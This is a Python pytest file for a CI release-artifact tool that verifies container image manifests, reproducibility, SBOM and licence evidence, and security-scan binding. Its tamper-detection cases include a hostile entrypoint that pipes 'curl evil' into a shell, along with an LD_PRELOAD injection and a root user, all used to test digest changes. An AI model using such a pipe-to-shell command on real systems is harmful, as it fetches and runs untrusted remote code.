from __future__ import annotations

import json
from pathlib import Path
import sys
from unittest import mock
from types import SimpleNamespace

import pytest

from tools.ci import release_artifact as ra
from tools.ci import image_security as real_security

REV = "a" * 40
LAYERS = ["sha256:" + c * 64 for c in "abc"]
CONFIG = "9" * 64


@pytest.fixture(autouse=True)
def security_boundary(monkeypatch):
    boundary = SimpleNamespace(
        verify_evidence=mock.Mock(return_value={"adjudicated": 2}),
        verify_image=mock.Mock(return_value={"native_verified": True}),
    )
    monkeypatch.setitem(sys.modules, "tools.ci.image_security", boundary)
    return boundary


def inspect_doc(**config: object) -> dict:
    """`docker image inspect` output as the classic store prints it."""
    base = {
        "User": "1000:1000",
        "Env": ["PATH=/usr/bin", "PYTHONUNBUFFERED=1"],
        "Entrypoint": ["/app/entrypoint"],
        "Cmd": None,
        "WorkingDir": "/app",
        "ExposedPorts": {"8300/tcp": {}},
        "Volumes": None,
        "Labels": {ra.LABEL: REV},
        "StopSignal": "",
        "OnBuild": None,
        "Healthcheck": {
            "Test": ["CMD", "/app/hc"],
            "Interval": 30000000000,
            "StartInterval": 0,
        },
    }
    base.update(config)
    return {
        "Id": "sha256:" + "1" * 64,
        "Architecture": "amd64",
        "Os": "linux",
        "Config": base,
        "RootFS": {"Layers": LAYERS},
    }


def test_base_images_must_be_digest_pinned(tmp_path):
    good = tmp_path / "Dockerfile"
    good.write_text(f"ARG PY_IMAGE=python:3.14@sha256:{'1' * 64}\nFROM ${{PY_IMAGE}}\n")
    assert ra.base_images(good) == {"PY_IMAGE": f"python:3.14@sha256:{'1' * 64}"}
    loose = tmp_path / "Loose"
    loose.write_text("ARG PY_IMAGE=python:3.14\nFROM ${PY_IMAGE}\n")
    with pytest.raises(ValueError):
        ra.base_images(loose)


def test_reproducibility_reports_differing_layers():
    same = {"layers": LAYERS, "revision": REV, "user": "1000"}
    other = {"layers": [LAYERS[0], "sha256:" + "f" * 64, LAYERS[2]], "revision": REV}
    files = {"/app/x.py": "'0' 644 0:0  abc"}
    with (
        mock.patch.object(ra, "identity", side_effect=[same, same]),
        mock.patch.object(ra, "filesystem", side_effect=[files, files]),
    ):
        result = ra.reproducibility("a", "b")
    assert result["identical"] is True and result["content_identical"] is True
    changed = {"/app/x.py": "'0' 644 0:0  def"}
    with (
        mock.patch.object(ra, "identity", side_effect=[same, other]),
        mock.patch.object(ra, "filesystem", side_effect=[files, changed]),
    ):
        result = ra.reproducibility("a", "b")
    assert result["identical"] is False
    assert result["differing_layer_indexes"] == [1] and result["equal_layers"] == 2
    assert result["content_identical"] is False
    assert result["differing_paths"] == ["/app/x.py"]


def materials(tmp_path: Path, passed: bool = True) -> dict[str, Path]:
    files = {
        "sbom.cdx.json": {"bomFormat": "CycloneDX", "components": [{"name": "x"}]},
        "licenses.json": {"Results": []},
        "license-verdict.json": {"passed": passed, "findings": 1},
        "reproducibility.json": {"identical": False, "content_identical": True},
        "image-security.json": {"fixture": "security"},
    }
    out = {}
    for name, doc in files.items():
        (tmp_path / name).write_text(json.dumps(doc))
        out[name] = tmp_path / name
    return out


def test_save_binds_materials_and_verify_materials_detects_tampering(tmp_path):
    src = tmp_path / "src"
    src.mkdir()
    dockerfile = tmp_path / "Dockerfile"
    dockerfile.write_text(f"ARG PY_IMAGE=python@sha256:{'2' * 64}\n")
    out = tmp_path / "release"

    def fake_docker(*args, **kwargs):
        if args[0] == "save":
            Path(args[2]).write_bytes(b"tar")
        return ""

    with (
        mock.patch.object(
            ra,
            "identity",
            return_value={
                "layers": LAYERS,
                "revision": REV,
                "user": "1000:1000",
                "config_sha256": CONFIG,
            },
        ),
        mock.patch.object(ra, "_docker", side_effect=fake_docker),
    ):
        manifest = ra.save(
            "img",
            REV,
            out,
            "1-1",
            materials=materials(src),
            tools={"trivy": "0.71.0"},
            dockerfile=dockerfile,
            source_tree="b" * 40,
        )
    ra.check_manifest(manifest, REV)
    assert ra.verify_materials(out, manifest)["sbom_components"] == 1
    (out / "licenses.json").write_text("{}")
    with pytest.raises(ValueError):
        ra.verify_materials(out, manifest)


def test_save_refuses_a_failed_licence_verdict(tmp_path):
    src = tmp_path / "src"
    src.mkdir()
    with (
        mock.patch.object(
            ra,
            "identity",
            return_value={"layers": LAYERS, "revision": REV, "user": "x"},
        ),
        pytest.raises(ValueError),
    ):
        ra.save(
            "img",
            REV,
            tmp_path / "r",
            "1-1",
            materials=materials(src, passed=False),
            tools={"t": "1"},
            dockerfile=tmp_path / "D",
            source_tree="b" * 40,
        )


def test_runtime_config_digest_ignores_omitted_empty_keys_only():
    # The containerd store omits unset keys that the classic store prints.
    classic = inspect_doc()
    containerd = inspect_doc(Cmd=None, Volumes=None, OnBuild=None)
    for key in ("Cmd", "Volumes", "StopSignal", "OnBuild"):
        containerd["Config"].pop(key)
    containerd["Config"]["Healthcheck"].pop("StartInterval")
    assert ra.config_digest(classic) == ra.config_digest(containerd)
    for change in (
        {"Entrypoint": ["/bin/sh", "-c", "curl evil | sh"]},
        {"Cmd": ["--debug"]},
        {"Env": ["PATH=/usr/bin", "PYTHONUNBUFFERED=1", "LD_PRELOAD=/x.so"]},
        {"User": "0"},
        {"WorkingDir": "/tmp"},
    ):
        assert ra.config_digest(inspect_doc(**change)) != ra.config_digest(classic)
    other_platform = inspect_doc()
    other_platform["Architecture"] = "arm64"
    assert ra.config_digest(other_platform) != ra.config_digest(classic)


def test_runtime_config_digest_keeps_ports_volumes_and_empty_labels():
    # Codex re-review: Docker stores port and volume declarations as keys with
    # {} values and labels may be empty strings; none of that may vanish.
    classic = inspect_doc()
    for change in (
        {"Volumes": {"/app": {}}},
        {"ExposedPorts": {"8300/tcp": {}, "9229/tcp": {}}},
        {"ExposedPorts": {"8301/tcp": {}}},
        {"ExposedPorts": None},
        {"Labels": {ra.LABEL: REV, "debug": ""}},
        {"Labels": {}},
        {"Healthcheck": None},
        {"Healthcheck": {"Test": ["NONE"]}},
    ):
        assert ra.config_digest(inspect_doc(**change)) != ra.config_digest(classic), (
            change
        )


def test_identity_reports_the_config_digest():
    doc = inspect_doc()
    with mock.patch.object(ra, "_docker", return_value=json.dumps([doc])):
        found = ra.identity("img")
    assert found["config_sha256"] == ra.config_digest(doc)
    assert found["image_id"] == doc["Id"]


def test_verify_refuses_a_config_only_replacement(tmp_path):
    tar = tmp_path / "core-image.tar"
    tar.write_bytes(b"tar")
    manifest = {
        "schema": ra.SCHEMA,
        "revision": REV,
        "run": "1-1",
        "reproducibility": {"content_identical": True},
        "tar_sha256": ra.sha256(tar),
        "layers": LAYERS,
        "config_sha256": CONFIG,
        "source_tree": "b" * 40,
        "tools": {"t": "1"},
        "materials": {n: "0" * 64 for n in ra.MATERIALS},
    }
    manifest["materials"] = {
        name: ra.sha256(file) for name, file in materials(tmp_path).items()
    }
    path = tmp_path / "manifest.json"
    path.write_text(json.dumps(manifest))
    same = {
        "layers": LAYERS,
        "revision": REV,
        "config_sha256": CONFIG,
        "image_id": "sha256:" + "2" * 64,
    }

    def docker(*args, **kwargs):
        return "Loaded image: klukai-core:release-x\n" if args[0] == "load" else ""

    with (
        mock.patch.object(ra, "_docker", side_effect=docker),
        mock.patch.object(ra, "identity", return_value=same),
    ):
        assert ra.verify(tar, path, REV, "klukai-core:ci-aaaaaaa")["layers"] == 3
    swapped = {**same, "config_sha256": "8" * 64}
    with (
        mock.patch.object(ra, "_docker", side_effect=docker),
        mock.patch.object(ra, "identity", return_value=swapped),
        pytest.raises(ValueError, match="configuration"),
    ):
        ra.verify(tar, path, REV, "klukai-core:ci-aaaaaaa")


def test_manifest_without_a_config_digest_is_malformed(tmp_path):
    manifest = {
        "schema": ra.SCHEMA,
        "revision": REV,
        "tar_sha256": "0" * 64,
        "layers": LAYERS,
        "source_tree": "b" * 40,
        "tools": {"t": "1"},
        "materials": {n: "0" * 64 for n in ra.MATERIALS},
    }
    with pytest.raises(ValueError):
        ra.check_manifest(manifest, REV)
    ra.check_manifest({**manifest, "config_sha256": CONFIG}, REV)


def test_content_differences_between_builds_are_refused(tmp_path):
    # Independent review finding 5: the second-build comparison was recorded
    # but never enforced.
    differing = {
        "identical": False,
        "content_identical": False,
        "differing_paths": ["/app/x.py"],
    }
    with (
        mock.patch.object(ra, "reproducibility", return_value=differing),
        mock.patch.object(
            sys,
            "argv",
            [
                "release_artifact",
                "compare-builds",
                "--first",
                "a",
                "--second",
                "b",
                "--output",
                str(tmp_path / "r.json"),
            ],
        ),
    ):
        assert ra.main() == 1
    assert json.loads((tmp_path / "r.json").read_text())["content_identical"] is False
    same = {**differing, "content_identical": True, "differing_paths": []}
    with (
        mock.patch.object(ra, "reproducibility", return_value=same),
        mock.patch.object(
            sys,
            "argv",
            [
                "release_artifact",
                "compare-builds",
                "--first",
                "a",
                "--second",
                "b",
                "--output",
                str(tmp_path / "s.json"),
            ],
        ),
    ):
        assert ra.main() == 0
    src = tmp_path / "src"
    src.mkdir()
    found = {"layers": LAYERS, "revision": REV, "user": "x", "config_sha256": CONFIG}
    mats = materials(src)
    mats["reproducibility.json"].write_text(json.dumps(differing))
    with (
        mock.patch.object(ra, "identity", return_value=found),
        pytest.raises(ValueError, match="content"),
    ):
        ra.save(
            "img",
            REV,
            tmp_path / "r",
            "1-1",
            materials=mats,
            tools={"t": "1"},
            dockerfile=tmp_path / "D",
            source_tree="b" * 40,
        )
    release = tmp_path / "release"
    release.mkdir()
    recorded = {name: ra.sha256(path) for name, path in materials(release).items()}
    with pytest.raises(ValueError, match="content"):
        ra.verify_materials(
            release,
            {
                **complete_manifest(),
                "materials": recorded,
                "reproducibility": differing,
            },
        )


def complete_manifest(schema=4):
    names = (
        "sbom.cdx.json",
        "licenses.json",
        "license-verdict.json",
        "reproducibility.json",
    )
    if schema == 4:
        names += ("image-security.json",)
    return {
        "schema": schema,
        "revision": REV,
        "run": "1-1",
        "tar_sha256": "0" * 64,
        "layers": LAYERS,
        "config_sha256": CONFIG,
        "source_tree": "b" * 40,
        "tools": {"trivy": "0.71.0"},
        "materials": {name: "0" * 64 for name in names},
        "reproducibility": {"content_identical": True},
    }


def test_schema4_requires_security_material_and_legacy_is_explicit():
    current = complete_manifest()
    ra.check_manifest(current, REV)
    assert ra.materials_for_manifest(current)[-1] == "image-security.json"
    legacy = complete_manifest(3)
    with pytest.raises(ValueError):
        ra.check_manifest(legacy, REV)
    ra.check_manifest(legacy, REV, allow_legacy=True)
    assert "image-security.json" not in ra.materials_for_manifest(
        legacy, allow_legacy=True
    )
    for broken in (
        {**current, "schema": 5},
        {**current, "schema": 3},
        {**legacy, "schema": 4},
        {**current, "materials": {**current["materials"], "extra.json": "0" * 64}},
    ):
        with pytest.raises(ValueError):
            ra.check_manifest(broken, REV, allow_legacy=True)


def artifact_bundle(tmp_path):
    tar = tmp_path / "core-image.tar"
    tar.write_bytes(b"tar")
    files = materials(tmp_path)
    manifest = {
        **complete_manifest(),
        "tar_sha256": ra.sha256(tar),
        "materials": {name: ra.sha256(path) for name, path in files.items()},
    }
    path = tmp_path / "manifest.json"
    path.write_text(json.dumps(manifest))
    return tar, path, manifest


def test_security_evidence_is_recomputed_before_loading(tmp_path, security_boundary):
    tar, path, manifest = artifact_bundle(tmp_path)
    security_boundary.verify_evidence.side_effect = ValueError("unresolved HIGH")
    with (
        mock.patch.object(ra, "_docker") as docker,
        pytest.raises(ValueError, match="unresolved"),
    ):
        ra.verify(tar, path, REV, "accepted")
    docker.assert_not_called()


def test_security_material_cannot_be_missing_or_tampered(tmp_path):
    tar, path, manifest = artifact_bundle(tmp_path)
    security = tmp_path / "image-security.json"
    security.unlink()
    with pytest.raises(OSError):
        ra.verify_materials(tmp_path, manifest)
    security.write_text('{"passed":true}')
    with pytest.raises(ValueError, match="image-security"):
        ra.verify_materials(tmp_path, manifest)


def test_loaded_image_native_bytes_are_checked_by_id_before_tagging(
    tmp_path, security_boundary
):
    tar, path, manifest = artifact_bundle(tmp_path)
    image_id = "sha256:" + "2" * 64
    events = []

    def docker(*args, **kwargs):
        events.append(args[0])
        return "Loaded image: mutable-tag\n" if args[0] == "load" else ""

    def native(candidate, envelope, bound):
        assert candidate == image_id
        assert envelope == {"fixture": "security"} and bound == manifest
        events.append("native")
        raise ValueError("native bytes differ")

    security_boundary.verify_image.side_effect = native
    with (
        mock.patch.object(ra, "_docker", side_effect=docker),
        mock.patch.object(
            ra,
            "identity",
            return_value={
                "revision": REV,
                "layers": LAYERS,
                "config_sha256": CONFIG,
                "image_id": image_id,
            },
        ),
        pytest.raises(ValueError, match="native bytes"),
    ):
        ra.verify(tar, path, REV, "accepted")
    assert events == ["load", "native"]


def test_save_refuses_unusable_security_evidence_before_writing_bundle(
    tmp_path, security_boundary
):
    src = tmp_path / "src"
    src.mkdir()
    dockerfile = tmp_path / "Dockerfile"
    dockerfile.write_text(f"ARG PY_IMAGE=python@sha256:{'2' * 64}\n")
    out = tmp_path / "release"
    security_boundary.verify_evidence.side_effect = ValueError(
        "stale security revision"
    )

    def save_tar(*args, **kwargs):
        Path(args[2]).write_bytes(b"tar")
        return ""

    with (
        mock.patch.object(
            ra,
            "identity",
            return_value={
                "layers": LAYERS,
                "revision": REV,
                "user": "1000",
                "config_sha256": CONFIG,
            },
        ),
        mock.patch.object(ra, "_docker", side_effect=save_tar) as docker,
        pytest.raises(ValueError, match="stale"),
    ):
        ra.save(
            "img",
            REV,
            out,
            "1-1",
            materials=materials(src),
            tools={"t": "1"},
            dockerfile=dockerfile,
            source_tree="b" * 40,
        )
    docker.assert_not_called()
    assert not out.exists()


@pytest.mark.parametrize(
    "change", [None, "stale-run", "forged-verdict", "substituted-sbom"]
)
def test_real_security_evidence_is_bound_and_recomputed(tmp_path, monkeypatch, change):
    from test_image_security import valid_evidence

    monkeypatch.setitem(sys.modules, "tools.ci.image_security", real_security)
    envelope, subject = valid_evidence()
    files = materials(tmp_path)
    security = files["image-security.json"]
    envelope["scanner"]["sbom_sha256"] = ra.sha256(files["sbom.cdx.json"])
    if change == "substituted-sbom":
        files["sbom.cdx.json"].write_text(
            '{"bomFormat":"CycloneDX","components":[{"name":"substituted"}]}'
        )
    if change == "stale-run":
        envelope["subject"]["run"] = "previous-run"
    elif change == "forged-verdict":
        envelope["filtered"]["Results"][0]["Vulnerabilities"] = [
            envelope["filtered"]["Results"][0]["ExperimentalModifiedFindings"].pop()[
                "Finding"
            ]
        ]
        envelope["verdict"] = {"passed": True}
    security.write_text(json.dumps(envelope))
    manifest = {
        **complete_manifest(),
        **subject,
        "materials": {name: ra.sha256(path) for name, path in files.items()},
    }
    if change:
        with pytest.raises(ValueError):
            ra.verify_materials(tmp_path, manifest)
    else:
        assert ra.verify_materials(tmp_path, manifest)["image_security"] == {
            "passed": True,
            "raw_high_critical": 3,
            "fixed": 3,
            "unresolved_high_critical": 0,
        }


def test_historical_schema3_verification_is_explicit_and_skips_new_native_proof(
    tmp_path, security_boundary
):
    tar, path, manifest = artifact_bundle(tmp_path)
    manifest["schema"] = 3
    del manifest["materials"]["image-security.json"]
    (tmp_path / "image-security.json").unlink()
    path.write_text(json.dumps(manifest))
    found = {
        "revision": REV,
        "layers": LAYERS,
        "config_sha256": CONFIG,
        "image_id": "sha256:" + "2" * 64,
    }
    with mock.patch.object(ra, "_docker") as docker, pytest.raises(ValueError):
        ra.verify(tar, path, REV, "history")
    docker.assert_not_called()
    with (
        mock.patch.object(ra, "_docker", return_value="Loaded image: archive\n"),
        mock.patch.object(ra, "identity", return_value=found),
    ):
        result = ra.verify(tar, path, REV, "history", allow_legacy=True)
    assert result["image_security"] == {"legacy_schema": 3}
    security_boundary.verify_image.assert_not_called()
    security_boundary.verify_evidence.assert_not_called()


def test_save_binds_the_same_sbom_in_its_provisional_security_manifest(
    tmp_path, security_boundary
):
    src = tmp_path / "src"
    src.mkdir()
    files = materials(src)
    dockerfile = tmp_path / "Dockerfile"
    dockerfile.write_text(f"ARG PY_IMAGE=python@sha256:{'2' * 64}\n")

    def bind(envelope, bound):
        assert bound.get("materials", {}).get("sbom.cdx.json") == ra.sha256(
            files["sbom.cdx.json"]
        )
        raise ValueError("stop after binding")

    security_boundary.verify_evidence.side_effect = bind
    with (
        mock.patch.object(
            ra,
            "identity",
            return_value={
                "layers": LAYERS,
                "revision": REV,
                "user": "1000",
                "config_sha256": CONFIG,
            },
        ),
        pytest.raises(ValueError, match="stop after binding"),
    ):
        ra.save(
            "img",
            REV,
            tmp_path / "out",
            "1-1",
            materials=files,
            tools={"t": "1"},
            dockerfile=dockerfile,
            source_tree="b" * 40,
        )
